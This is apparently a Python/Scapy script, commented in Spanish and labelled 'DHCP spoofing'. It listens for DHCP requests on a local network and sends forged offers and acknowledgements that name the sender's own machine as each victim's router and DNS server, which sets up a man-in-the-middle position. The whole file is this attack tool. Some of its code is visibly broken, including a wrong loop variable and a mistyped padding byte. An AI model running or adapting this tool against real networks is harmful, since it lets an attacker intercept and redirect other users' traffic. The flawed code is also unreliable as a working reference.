from scapy.all import Scapy_Exception, IP, Ether, UDP, BOOTP, DHCP, get_if_hwaddr, sniff, sendp, get_if_addr
import socket
import argparse
import time
import re

IFACE = "eth0"

def get_broadcast(ipv4, prefix):
    """
    Calcula la dirección de broadcast de una subred IPv4.

    Parámetros:
        ipv4 (str): IP de un host de la red, ej. "192.168.0.67".
        prefix (int): longitud del prefijo (0 a 32).

    Retorna:
        str: dirección de broadcast en formato decimal con puntos.
    """
    if not isinstance(prefix, int) or not (0 <= prefix <= 32):
        raise ValueError("El prefijo debe ser un entero entre 0 y 32.")

    # IP (string) -> entero de 32 bits
    ip_int = 0
    for octeto in (int(x) for x in ipv4.split(".")):
        ip_int = (ip_int << 8) | octeto

    # broadcast = IP OR (complemento de la máscara)
    mask_int = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
    broadcast_int = ip_int | (~mask_int & 0xFFFFFFFF)

    # entero -> decimal con puntos
    return ".".join(str((broadcast_int >> (8 * i)) & 0xFF) for i in range(3, -1, -1))

def prefix_to_netmask(prefix):
    """
    Convierte un prefijo CIDR (por ejemplo, 24) en una máscara IPv4 (por ejemplo, 255.255.255.0).

    Parámetros:
        prefix (int): longitud del prefijo (0 a 32).

    Retorna:
        str: máscara IPv4 en formato decimal.
    """
    # Validación de entrada
    if not isinstance(prefix, int) or not (0 <= prefix <= 32):
        raise ValueError("El prefijo debe ser un entero entre 0 y 32.")

    # Crear máscara como entero de 32 bits
    mask_int = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF

    # Convertir a formato decimal con puntos
    return ".".join(str((mask_int >> (8 * i)) & 0xFF) for i in range(3, -1, -1))


def get_my_mac(interface):
    return get_if_hwaddr(interface)

def get_my_ip(interface):
    ip = get_if_addr(interface)
    if ip in (None, "0.0.0.0"):
        raise RuntimeError(f"La interfaz '{interface}' no tiene IPv4 asignada")
    return ip

def crear_args():
    p = argparse.ArgumentParser(description="DHCP spoofing")
    p.add_argument("-r", "--red", required=True, help="IPv4/mask - 192.168.0.67/24")
    p.add_argument("-i", "--iface", default= IFACE)
    p.add_argument("-d", "--duration", type=int, default=10, help="segundos; 0=infinito")
    p.add_argument("-l", "--lease", type=int, default= 86400, help="Segundos que dura el prestamo")
    return p.parse_args()

def validate_ip(red):
    # solo una barra
    if red.count("/") != 1:
        print(f"[!] '{red}': falta la máscara, usá formato x.x.x.x/x"); return -1
    # tiene que tener si o si 3 puntos
    if red.count(".") != 3:
        print(f"[!] '{red}': no es IPv4 válida (debe tener 4 octetos)"); return -1
    # no puede haber letras
    if re.search("[a-zA-Z]", red):
        print(f"[!] '{red}': contiene letras"); return -1

    mascara_idx = red.index("/")  # busco donde comienza la barra
    try:
        mascara = int(red[mascara_idx + 1 :])  # solo el numero de la mascara
    except ValueError:
        print(f"[!] '{red}': la máscara no es un número"); return -1

    ipv4 = red[:mascara_idx]  # solo la parte de la ip

    # OPTIMIZACIÓN: Separamos los octetos directamente usando split
    try:
        octetos = [int(x) for x in ipv4.split(".")]
    except ValueError:
        # Por si hay puntos consecutivos o formatos extraños como '10..0.1'
        print(f"[!] '{red}': octetos inválidos"); return -1

    # Validamos que los 4 octetos estén en el rango correcto (0-255)
    for octeto in octetos:
        if octeto < 0 or octeto > 255:
            print(f"[!] '{red}': octeto fuera de rango (0-255)"); return -1

    # la mascara no puede ser menor q 0 ni mayor qq 32
    if mascara > 32 or mascara < 0:
            print(f"[!] '{red}': máscara fuera de rango (0-32)"); return -1

    match octetos[0]:
        case 10:
            if mascara < 8:  # CORRECCIÓN: La red de clase A privada (10.0.0.0) empieza en /8
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
        case 172:
            if octetos[1] < 16 or octetos[1] > 31:  # segundo octeto entre 16-31
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
            if mascara < 12:  # la mascara no puede ser menor a 12
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
        case 192:
            if octetos[1] != 168:  # el 2do octeto debe ser 168
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
            if mascara < 16:  # la mascara no puede ser menor a 16
                print(f"[!] '{red}': máscara incoherente para esa clase privada"); return -1
        case _:  # cualquier otro caso es invalido porque no es privada
                print(f"[!] '{red}': no es una IP privada (RFC1918)"); return -1

    return (ipv4, mascara)

def armar_respuesta(pkt, tipo, mi_ip, ip_offer, mascara, lease, mi_mac, interface):
    eth_field = Ether(src= mi_mac, dst="ff:ff:ff:ff:ff:ff")
    ip_field = IP(src=mi_ip, dst="255.255.255.255")
    udp_field = UDP(sport=67, dport=68)
    mac_victima = pkt[Ether].src
    bootp_field = BOOTP(
        op= 2, # 1 request y 2 reply
        xid = pkt[BOOTP].xid,
        yiaddr = ip_offer,
        siaddr = mi_ip,
        chaddr = bytes.fromhex(mac_victima.replace(":", ""))+b'/x00'*10
    )
    message_value = "offer" if tipo == 1 else "ack"
    dhcp_field = DHCP(
        options = [
            ("message-type", message_value),
            ("server_id", mi_ip),
            ("lease_time", lease),
            ("renewal_time", 43200), # dsp usar args para esto
            ("rebinding_time", 75600), # lo mismo aca
            ("subnet_mask", prefix_to_netmask(mascara)),
            ("broadcast_address", get_broadcast(ip_offer, mascara)),
            ("router", mi_ip),
            ("name_server", mi_ip),
            "end"
        ]
    )

    sendp(eth_field/ip_field/udp_field/bootp_field/dhcp_field, iface=interface, verbose=False)

def procesar_pkt(pkt, mi_ip, ip_offer, mascara, lease, mi_mac, interface):
    if IP in pkt:
        ip_data = pkt[IP]
        if ip_data.src == mi_ip:
            return

    if DHCP not in pkt:
        return

    dhcp_data = pkt[DHCP].options
    for opt in dhcp_data.options:
        if isinstance(dhcp_data, tuple) and dhcp_data[0] == 'message-type':
            dora = dhcp_data[1]
            if dora == 1 or dora ==3:
                armar_respuesta(pkt, dora, mi_ip, ip_offer, mascara, lease, mi_mac, interface)

    return

def sniff_netword(args, resultado ):
    ip_offer, mascara = resultado
    interface = args.iface
    duration = args.duration
    lease = args.lease

    mi_ip = get_my_ip(interface)
    mi_mac = get_my_mac(interface)

    timeout = duration if duration > 0 else None

    try:
        sniff(
              filter="udp and (port 67 or port 68)",
              prn=lambda pkt: procesar_pkt(pkt, mi_ip, ip_offer, mascara, lease, mi_mac, interface),
              store=False,
              iface=interface,
              timeout=timeout
        )
    except KeyboardInterrupt:
        print("cerrando programa...")
    except PermissionError:
        print("Error: Permisos insuficientes. Usa el script con sudo")
    except Scapy_Exception as e:
        print(f"Error de Scapy: {e}")
    except OSError as e:
        print(f"Error de red: {e}")
    except Exception as e:
        print(f"Error global: {e}")

def main():
    args = crear_args()
    red = args.red

    resultado = validate_ip(red)
    if resultado == -1:
        return


    sniff_netword(args, resultado)




if __name__ == "__main__":
    main()
